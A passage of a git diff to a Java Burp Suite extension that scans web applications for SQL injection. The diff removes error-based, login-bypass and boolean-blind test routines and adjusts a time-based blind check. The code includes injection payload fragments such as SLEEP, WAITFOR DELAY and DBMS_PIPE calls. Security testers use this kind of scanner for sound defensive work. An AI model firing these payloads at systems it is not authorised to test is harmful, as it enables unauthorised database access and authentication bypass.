                     TimingLock.acquire();
-                    testTimeBased(original, ip, baselineTime, detectedDbms);
+                    testTimeBased(original, ip, detectedDbms);
                 } catch (InterruptedException e) {
                     Thread.currentThread().interrupt();
                     return;
@@ -898,315 +520,6 @@ public class SmartSqliDetector implements ScanModule {
         }
     }
 
-    // ==================== PHASE 2: ERROR-BASED ====================
-
-    private void testErrorBased(HttpRequestResponse original, InjectionPoint ip, String baselineBody,
-                                 String detectedDbms) {
-        // Baseline stability check: verify baseline body is stable across requests
-        try {
-            HttpRequestResponse stabCheck = sendWithPayload(original, ip, ip.originalValue);
-            if (stabCheck != null && stabCheck.response() != null) {
-                String stabBody = stabCheck.response().bodyToString();
-                if (stabBody == null) stabBody = "";
-                // Check for SQL error patterns already present in fresh baseline
-                for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
-                    for (Pattern p : entry.getValue()) {
-                        if (p.matcher(stabBody != null ? stabBody : "").find()
-                                && (baselineBody == null || !p.matcher(baselineBody).find())) {
-                            // Baseline is producing different error content on repeated requests
-                            api.logging().logToOutput("[SQLi] Skipping error-based for " + ip.name
-                                    + " — baseline response contains unstable error patterns");
-                            return;
-                        }
-                    }
-                }
-            }
-        } catch (Exception ignored) {}
-
-        for (Map.Entry<String, String[]> dbmsEntry : ERROR_PAYLOADS_BY_DBMS.entrySet()) {
-            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
-            String payloadDbms = dbmsEntry.getKey();
-
-            // DBMS filtering: if fingerprint identified a DBMS, skip payloads for other DBMSes
-            if (detectedDbms != null && !payloadDbms.equals("Generic") && !payloadDbms.equals(detectedDbms)) {
-                continue;
-            }
-
-            for (String payload : dbmsEntry.getValue()) {
-                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
-                try {
-
-                    HttpRequestResponse result = sendWithPayload(original, ip, payload);
-                    if (result == null || result.response() == null) continue;
-                    if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }
-
-                    // Skip 400 Bad Request — often just input validation rejecting the quote/payload,
-                    // and the error page may contain SQL-like keywords (e.g., "syntax error in query string")
-                    int statusCode = result.response().statusCode();
-                    if (statusCode >= 400 && statusCode < 500) continue; // Skip ALL 4xx — WAF, rate limit, auth, not-found
-
-                    String responseBody = result.response().bodyToString();
-                    if (responseBody == null) responseBody = "";
-
-                    // Check for SQL error signatures
-                    for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
-                        String dbType = entry.getKey();
-                        for (Pattern pattern : entry.getValue()) {
-                            Matcher m = pattern.matcher(responseBody);
-                            // Guard: if baseline is empty, require the response to be a 500 (server error)
-                            // to avoid matching error keywords in generic error pages
-                            boolean baselineEmpty = baselineBody == null || baselineBody.isEmpty();
-                            if (baselineEmpty && statusCode != 500) continue;
-                            if (m.find() && !pattern.matcher(baselineBody != null ? baselineBody : "").find()) {
-                                String evidence = m.group();
-                                // Guard: require at least 2 matching DBMS-group patterns in the response,
-                                // OR 1 pattern + HTTP 500 status, to reduce false positives from single
-                                // keyword matches on error pages (applies to both empty and non-empty baselines)
-                                int extraMatches = 0;
-                                for (Pattern p2 : entry.getValue()) {
-                                    if (p2 != pattern && p2.matcher(responseBody).find()) extraMatches++;
-                                }
-                                if (extraMatches < 1 && statusCode != 500) continue; // Require 2+ patterns or 500 status
-                                findingsStore.addFinding(Finding.builder("sqli-detector",
-                                                "SQL Injection (Error-Based) - " + dbType,
-                                                Severity.HIGH, Confidence.FIRM)
-                                        .url(original.request().url())
-                                        .parameter(ip.name)
-                                        .evidence("Payload: " + payload + " | Error: " + evidence)
-                                        .payload(payload)
-                                        .responseEvidence(evidence)
-                                        .description("Error-based SQL injection detected. DB type: " + dbType
-                                                + ". Parameter '" + ip.name + "' triggered a SQL error.")
-                                        .requestResponse(result)
-                                        .build());
-                                return; // Found error-based, skip remaining payloads
-                            }
-                        }
-                    }
-
-                    perHostDelay();
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                    return;
-                }
-            }
-        }
-    }
-
-    // ==================== PHASE 2: AUTH BYPASS ====================
-
-    private void testAuthBypass(HttpRequestResponse original, InjectionPoint ip,
-                                 int baselineStatus, int baselineLength, String baselineBody) {
-        // Only test parameters that look like login/username fields, or any parameter in a POST
-        // request that has a password-like sibling parameter
-        boolean isLoginParam = isLoginParameter(ip, original.request());
-        if (!isLoginParam) return;
-
-        api.logging().logToOutput("[SQLi] Auth bypass: testing param '" + ip.name + "' (login parameter detected)");
-
-        String baselineLower = baselineBody.toLowerCase();
-
-        // Check if baseline looks like a failed login (has failure keywords or is a login page)
-        boolean baselineHasFailure = false;
-        for (String keyword : FAILURE_KEYWORDS) {
-            if (baselineLower.contains(keyword)) {
-                baselineHasFailure = true;
-                break;
-            }
-        }
-
-        for (String payloadTemplate : AUTH_BYPASS_PAYLOADS) {
-            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
-            try {
-                String payload = payloadTemplate.replace("ORIGINAL_VALUE", ip.originalValue);
-
-                HttpRequestResponse result = sendWithPayload(original, ip, payload);
-                if (result == null || result.response() == null) continue;
-                if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }
-
-                int resultStatus = result.response().statusCode();
-                // Skip ALL 4xx responses — rate limiting, WAF blocks, auth failures, not-found etc.
-                // A real auth bypass produces 200 or 302, never 4xx.
-                if (resultStatus >= 400 && resultStatus < 500) { perHostDelay(); continue; }
-
-                String resultBody = result.response().bodyToString();
-                if (resultBody == null) resultBody = "";
-                int resultLength = resultBody.length();
-                String resultLower = resultBody.toLowerCase();
-
-                // Detection signals for successful auth bypass
-                List<String> signals = new ArrayList<>();
-
-                // Signal 1: Status code changed to redirect (302, 303) — classic login redirect
-                // But NOT if redirecting to an error/block/login page (WAF/security filter)
-                if ((baselineStatus == 200 || baselineStatus == 401 || baselineStatus == 403)
-                        && (resultStatus == 302 || resultStatus == 303)) {
-                    String location = "";
-                    for (var h : result.response().headers()) {
-                        if (h.name().equalsIgnoreCase("Location")) {
-                            location = h.value().toLowerCase();
-                            break;
-                        }
-                    }
-                    // Skip redirects to error/block/login pages — these are WAF/security rejections, not auth bypass
-                    boolean isBlockRedirect = location.contains("error") || location.contains("block")
-                            || location.contains("denied") || location.contains("security")
-                            || location.contains("waf") || location.contains("captcha")
-                            || location.contains("login") || location.contains("signin")
-                            || location.contains("unauthorized") || location.contains("forbidden");
-                    if (!isBlockRedirect) {
-                        signals.add("Redirect: HTTP " + baselineStatus + " → " + resultStatus
-                                + (location.isEmpty() ? "" : " (Location: " + location + ")"));
-                    }
-                }
-
-                // Signal 2: Status code changed from error to success
-                if ((baselineStatus == 401 || baselineStatus == 403) && resultStatus == 200) {
-                    signals.add("Status change: HTTP " + baselineStatus + " → 200 OK");
-                }
-
-                // Signal 3: New Set-Cookie header appeared (new session created)
-                boolean baselineHasCookie = false;
-                boolean resultHasCookie = false;
-                for (var h : original.response() != null ? original.response().headers() : List.<burp.api.montoya.http.message.HttpHeader>of()) {
-                    if (h.name().equalsIgnoreCase("Set-Cookie")) { baselineHasCookie = true; break; }
-                }
-                for (var h : result.response().headers()) {
-                    if (h.name().equalsIgnoreCase("Set-Cookie")) { resultHasCookie = true; break; }
-                }
-                if (resultHasCookie && !baselineHasCookie) {
-                    signals.add("New session cookie set (Set-Cookie header appeared)");
-                }
-
-                // Signal 4: Success keywords appeared in response
-                for (String keyword : SUCCESS_KEYWORDS) {
-                    if (resultLower.contains(keyword) && !baselineLower.contains(keyword)) {
-                        signals.add("Success keyword appeared: '" + keyword + "'");
-                        break;
-                    }
-                }
-
-                // Signal 5: Failure keywords disappeared from response
-                if (baselineHasFailure) {
-                    boolean stillHasFailure = false;
-                    for (String keyword : FAILURE_KEYWORDS) {
-                        if (resultLower.contains(keyword)) {
-                            stillHasFailure = true;
-                            break;
-                        }
-                    }
-                    if (!stillHasFailure) {
-                        signals.add("Login failure message disappeared");
-                    }
-                }
-
-                // Signal 6: Significant body length change (more than 30% different)
-                if (baselineLength > 0) {
-                    double ratio = Math.abs(resultLength - baselineLength) / (double) baselineLength;
-                    if (ratio > 0.3 && Math.abs(resultLength - baselineLength) > 200) {
-                        signals.add("Body length changed significantly: " + baselineLength + " → " + resultLength
-                                + " (" + Math.round(ratio * 100) + "% difference)");
-                    }
-                }
-
-                // Report only if we have strong structural signals
-                // Must have at least 2 signals AND at least one must be an authentication artifact
-                // (session cookie or success keyword — not just status/length changes)
-                boolean hasAuthArtifact = false;
-                for (String signal : signals) {
-                    if (signal.contains("session cookie") || signal.contains("Success keyword")) {
-                        hasAuthArtifact = true;
-                        break;
-                    }
-                }
-
-                if (signals.size() >= 2 && hasAuthArtifact) {
-                    // Multiple signals with auth artifact — confirmed bypass
-                    findingsStore.addFinding(Finding.builder("sqli-detector",
-                                    "SQL Injection — Authentication Bypass",
-                                    Severity.CRITICAL, Confidence.FIRM)
-                            .url(original.request().url())
-                            .parameter(ip.name)
-                            .evidence("Payload: " + payload + "\n" + String.join("\n", signals))
-                            .payload(payload)
-                            .description("Authentication bypass via SQL injection. The payload '" + payload
-                                    + "' in parameter '" + ip.name + "' caused a response with authentication "
-                                    + "artifacts (session cookie and/or authenticated-area content) that were "
-                                    + "absent in the baseline failed-login response.")
-                            .remediation("Use parameterized queries (prepared statements) instead of string "
-                                    + "concatenation in SQL queries. Never build SQL queries by concatenating "
-                                    + "user input directly.")
-                            .requestResponse(result)
-                            .build());
-                    api.logging().logToOutput("[SQLi] Auth bypass CONFIRMED for param '" + ip.name
-                            + "' with payload: " + payload + " | Signals: " + signals);
-                    return;
-                }
-                // Single-signal findings are NOT reported — they are too FP-prone.
-                // A 302 redirect or body length change alone is not evidence of auth bypass.
-
-                perHostDelay();
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                return;
-            }
-        }
-    }
-
-    /**
-     * Determines if a parameter looks like a login/username field.
-     * Checks the parameter name and whether a password-like sibling parameter exists.
-     */
-    private boolean isLoginParameter(InjectionPoint ip, HttpRequest request) {
-        String nameLower = ip.name.toLowerCase().replaceAll("[_\\-.]", "");
-
-        // Direct match on parameter name
-        for (String loginName : LOGIN_PARAM_NAMES) {
-            if (nameLower.equals(loginName.replace("_", ""))) {
-                return true;
-            }
-        }
-
-        // Check if there's a password-like sibling parameter (strong hint this is a login form)
-        boolean hasPasswordSibling = false;
-        for (var param : request.parameters()) {
-            String pName = param.name().toLowerCase().replaceAll("[_\\-.]", "");
-            if (pName.contains("password") || pName.contains("passwd") || pName.contains("pass")
-                    || pName.equals("pw") || pName.equals("pwd")) {
-                hasPasswordSibling = true;
-                break;
-            }
-        }
-
-        // Also check JSON body for password fields
-        if (!hasPasswordSibling) {
-            String contentType = "";
-            for (var h : request.headers()) {
-                if (h.name().equalsIgnoreCase("Content-Type")) {
-                    contentType = h.value();
-                    break;
-                }
-            }
-            if (contentType.contains("application/json")) {
-                String body = request.bodyToString();
-                if (body != null) {
-                    String bodyLower = body.toLowerCase();
-                    hasPasswordSibling = bodyLower.contains("\"password\"") || bodyLower.contains("\"passwd\"")
-                            || bodyLower.contains("\"pass\"") || bodyLower.contains("\"pwd\"");
-                }
-            }
-        }
-
-        // If there's a password sibling, any non-password text field could be the username
-        if (hasPasswordSibling) {
-            String pName = ip.name.toLowerCase();
-            return !pName.contains("password") && !pName.contains("passwd")
-                    && !pName.contains("pass") && !pName.equals("pw") && !pName.equals("pwd")
-                    && !pName.contains("csrf") && !pName.contains("token");
-        }
-
-        return false;
-    }
 
     // ==================== PHASE 3: UNION-BASED ====================
 
@@ -1467,9 +780,9 @@ public class SmartSqliDetector implements ScanModule {
 
     // ==================== PHASE 4: TIME-BASED BLIND ====================
 
-    private void testTimeBased(HttpRequestResponse original, InjectionPoint ip, long baselineTime,
+    private void testTimeBased(HttpRequestResponse original, InjectionPoint ip,
                                 String detectedDbms) {
-        int delayThreshold = config.getInt("sqli.time.threshold", 14400);
+        int delayThreshold = config.getInt("sqli.time.threshold", 3000);
 
         // Step 0: Collect 3 baseline measurements and check stability
         long[] baselines = new long[3];
@@ -1583,187 +896,36 @@ public class SmartSqliDetector implements ScanModule {
         }
     }
 
-    /**
-     * Build a false-condition version of a time-based payload.
-     * E.g., SLEEP(18) → IF(1=2,SLEEP(18),0), PG_SLEEP(18) → CASE WHEN 1=2 THEN PG_SLEEP(18) END
-     */
     private String buildFalseConditionPayload(String truePayload, String dbType) {
-        // Try to convert common patterns to false conditions
-        if (truePayload.contains("SLEEP(18)") && !truePayload.contains("IF(")) {
-            return truePayload.replace("SLEEP(18)", "IF(1=2,SLEEP(18),0)");
+        if (truePayload.contains("SLEEP(5)") && !truePayload.contains("IF(")) {
+            return truePayload.replace("SLEEP(5)", "IF(1=2,SLEEP(5),0)");
         }
-        if (truePayload.contains("IF(1=1,SLEEP(18)")) {
-            return truePayload.replace("IF(1=1,SLEEP(18)", "IF(1=2,SLEEP(18)");
+        if (truePayload.contains("IF(1=1,SLEEP(5)")) {
+            return truePayload.replace("IF(1=1,SLEEP(5)", "IF(1=2,SLEEP(5)");
         }
-        if (truePayload.contains("WHEN 1=1 THEN SLEEP(18)")) {
-            return truePayload.replace("WHEN 1=1 THEN SLEEP(18)", "WHEN 1=2 THEN SLEEP(18)");
+        if (truePayload.contains("PG_SLEEP(5)") && !truePayload.contains("CASE")) {
+            return truePayload.replace("PG_SLEEP(5)", "CASE WHEN 1=2 THEN PG_SLEEP(5) END");
         }
-        if (truePayload.contains("PG_SLEEP(18)") && !truePayload.contains("CASE")) {
-            return truePayload.replace("PG_SLEEP(18)", "CASE WHEN 1=2 THEN PG_SLEEP(18) END");
-        }
-        if (truePayload.contains("WHEN 1=1 THEN") && truePayload.contains("PG_SLEEP")) {
+        if (truePayload.contains("WHEN 1=1 THEN")) {
             return truePayload.replace("WHEN 1=1 THEN", "WHEN 1=2 THEN");
         }
-        if (truePayload.contains("WAITFOR DELAY") && !truePayload.contains("IF(")) {
+        if (truePayload.contains("WAITFOR DELAY") && !truePayload.contains("IF")) {
             return truePayload.replace("WAITFOR DELAY", "IF 1=2 WAITFOR DELAY");
         }
         if (truePayload.contains("IF(1=1) WAITFOR") || truePayload.contains("IF 1=1 WAITFOR")) {
             return truePayload.replace("1=1", "1=2");
         }
-        if (truePayload.contains("WHEN 1=1 THEN") && truePayload.contains("WAITFOR")) {
-            return truePayload.replace("WHEN 1=1 THEN", "WHEN 1=2 THEN");
-        }
         if (truePayload.contains("DBMS_PIPE.RECEIVE_MESSAGE")) {
-            if (truePayload.contains("WHEN 1=1")) {
-                return truePayload.replace("WHEN 1=1", "WHEN 1=2");
-            }
-            // Fallback for direct payloads like "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -"
-            return truePayload.replace("DBMS_PIPE.RECEIVE_MESSAGE('a',18)", "DBMS_PIPE.RECEIVE_MESSAGE('a',0)");
+            if (truePayload.contains("WHEN 1=1")) return truePayload.replace("WHEN 1=1", "WHEN 1=2");
+            return truePayload.replace("DBMS_PIPE.RECEIVE_MESSAGE('a',5)", "DBMS_PIPE.RECEIVE_MESSAGE('a',0)");
         }
         if (truePayload.contains("DBMS_LOCK.SLEEP") || truePayload.contains("DBMS_SESSION.SLEEP")) {
-            return truePayload.replace("BEGIN", "BEGIN IF 1=2 THEN")
-                    .replace("END;", "END IF; END;");
+            return truePayload.replace("BEGIN", "BEGIN IF 1=2 THEN").replace("END;", "END IF; END;");
         }
-        // BENCHMARK: replace with a tiny count
         if (truePayload.contains("BENCHMARK(")) {
             return truePayload.replaceFirst("BENCHMARK\\(\\d+", "BENCHMARK(1");
         }
-        return null; // No false condition available
-    }
-
-    // ==================== PHASE 5: BOOLEAN-BASED BLIND ====================
-
-    private void testBooleanBased(HttpRequestResponse original, InjectionPoint ip,
-                                   int baselineLength, int baselineStatus, String baselineBody) {
-        // Baseline stability check: send the same request twice to detect unstable endpoints
-        try {
-            HttpRequestResponse stab1 = sendWithPayload(original, ip, ip.originalValue);
-            HttpRequestResponse stab2 = sendWithPayload(original, ip, ip.originalValue);
-            if (stab1 != null && stab2 != null && stab1.response() != null && stab2.response() != null) {
-                String _stabBody1 = stab1.response().bodyToString();
-                if (_stabBody1 == null) _stabBody1 = "";
-                String _stabBody2 = stab2.response().bodyToString();
-                if (_stabBody2 == null) _stabBody2 = "";
-                int len1 = _stabBody1.length();
-                int len2 = _stabBody2.length();
-                if (stab1.response().statusCode() != stab2.response().statusCode()
-                        || Math.abs(len1 - len2) > 300) {
-                    api.logging().logToOutput("[SQLi] Skipping boolean-based for " + ip.name
-                            + " — endpoint is unstable (identical requests produce different responses)");
-                    return;
-                }
-            }
-        } catch (Exception ignored) {}
-
-        // FP guard: check if the endpoint naturally varies responses for different input values.
-        // If sending a benign modified value (original + "xyz") produces a significantly different
-        // response from baseline, this endpoint is parameter-driven (search, filter, routing).
-        // Boolean-blind detection can't distinguish app logic from SQL boolean conditions on such endpoints.
-        try {
-            String benignProbe = ip.originalValue + "xyz";
-            HttpRequestResponse benignResult = sendWithPayload(original, ip, benignProbe);
-            if (benignResult != null && benignResult.response() != null) {
-                String _benignBody = benignResult.response().bodyToString();
-                int benignLen = _benignBody != null ? _benignBody.length() : 0;
-                if (Math.abs(benignLen - baselineLength) > 300
-                        || benignResult.response().statusCode() != baselineStatus) {
-                    api.logging().logToOutput("[SQLi] Skipping boolean-based for " + ip.name
-                            + " — endpoint varies naturally for different input values (FP risk)");
-                    return;
-                }
-            }
-        } catch (Exception ignored) {}
-
-        for (String[] pair : BOOLEAN_PAIRS) {
-            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
-            try {
-                // Round 1: true + false
-                HttpRequestResponse trueResult1 = sendWithPayload(original, ip, pair[0]);
-                if (trueResult1 == null || trueResult1.response() == null) continue;
-                if (!ResponseGuard.isUsableResponse(trueResult1)) { perHostDelay(); continue; }
-                HttpRequestResponse falseResult1 = sendWithPayload(original, ip, pair[1]);
-                if (falseResult1 == null || falseResult1.response() == null) continue;
-                if (!ResponseGuard.isUsableResponse(falseResult1)) { perHostDelay(); continue; }
-
-                String _trueBody1 = trueResult1.response().bodyToString();
-                if (_trueBody1 == null) _trueBody1 = "";
-                String _falseBody1 = falseResult1.response().bodyToString();
-                if (_falseBody1 == null) _falseBody1 = "";
-                int trueLen1 = _trueBody1.length();
-                int falseLen1 = _falseBody1.length();
-                int trueStatus1 = trueResult1.response().statusCode();
-                int falseStatus1 = falseResult1.response().statusCode();
-
-                // True condition should be similar to baseline, false should differ.
-                // 200-byte tolerance absorbs CSRF token rotation and per-request dynamic content.
-                boolean trueMatchesBaseline = Math.abs(trueLen1 - baselineLength) < 200
-                        && trueStatus1 == baselineStatus;
-                boolean falseDiffers = Math.abs(falseLen1 - baselineLength) > 300
-                        || falseStatus1 != baselineStatus;
-
-                // If true response differs from baseline, the app is reacting to injected
-                // syntax itself, not evaluating the condition → discard
-                if (!trueMatchesBaseline) continue;
-                if (!falseDiffers) continue;
-
-                // Round 2: repeat both to confirm reproducibility
-                HttpRequestResponse trueResult2 = sendWithPayload(original, ip, pair[0]);
-                if (trueResult2 == null || trueResult2.response() == null) continue;
-                if (!ResponseGuard.isUsableResponse(trueResult2)) { perHostDelay(); continue; }
-                HttpRequestResponse falseResult2 = sendWithPayload(original, ip, pair[1]);
-                if (falseResult2 == null || falseResult2.response() == null) continue;
-                if (!ResponseGuard.isUsableResponse(falseResult2)) { perHostDelay(); continue; }
-
-                String _trueBody2 = trueResult2.response().bodyToString();
-                if (_trueBody2 == null) _trueBody2 = "";
-                String _falseBody2 = falseResult2.response().bodyToString();
-                if (_falseBody2 == null) _falseBody2 = "";
-                int trueLen2 = _trueBody2.length();
-                int falseLen2 = _falseBody2.length();
-                int trueStatus2 = trueResult2.response().statusCode();
-                int falseStatus2 = falseResult2.response().statusCode();
-
-                // Verify Round 2 matches Round 1.
-                // Tolerance is 200 bytes to absorb CSRF token rotation (128-256 bytes)
-                // and other per-request dynamic content (timestamps, nonces).
-                // Status code match is the primary consistency signal.
-                boolean trueConsistent = Math.abs(trueLen2 - trueLen1) < 200
-                        && trueStatus2 == trueStatus1;
-                boolean falseConsistent = Math.abs(falseLen2 - falseLen1) < 200
-                        && falseStatus2 == falseStatus1;
-                boolean trueStillMatchesBaseline = Math.abs(trueLen2 - baselineLength) < 200
-                        && trueStatus2 == baselineStatus;
-                boolean falseStillDiffers = Math.abs(falseLen2 - baselineLength) > 300
-                        || falseStatus2 != baselineStatus;
-
-                if (trueConsistent && falseConsistent && trueStillMatchesBaseline && falseStillDiffers) {
-                    findingsStore.addFinding(Finding.builder("sqli-detector",
-                                    "SQL Injection (Boolean-Based Blind) - Confirmed",
-                                    Severity.HIGH, Confidence.FIRM)
-                            .url(original.request().url())
-                            .parameter(ip.name)
-                            .evidence("True payload: " + pair[0]
-                                    + "\n  Round 1: len=" + trueLen1 + ", status=" + trueStatus1
-                                    + "\n  Round 2: len=" + trueLen2 + ", status=" + trueStatus2
-                                    + "\nFalse payload: " + pair[1]
-                                    + "\n  Round 1: len=" + falseLen1 + ", status=" + falseStatus1
-                                    + "\n  Round 2: len=" + falseLen2 + ", status=" + falseStatus2
-                                    + "\nBaseline: len=" + baselineLength + ", status=" + baselineStatus)
-                            .payload(pair[0])
-                            .description("Boolean-based blind SQL injection confirmed. True/false conditions "
-                                    + "produce consistently different responses across 2 rounds. "
-                                    + "True condition matches baseline, false condition differs.")
-                            .requestResponse(trueResult1)
-                            .build());
-                    return;
-                }
-                // If distinction is not reproducible → discard
-                perHostDelay();
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                return;
-            }
-        }
+        return null;
     }
 
     // ==================== PHASE 6: OOB VIA COLLABORATOR ====================
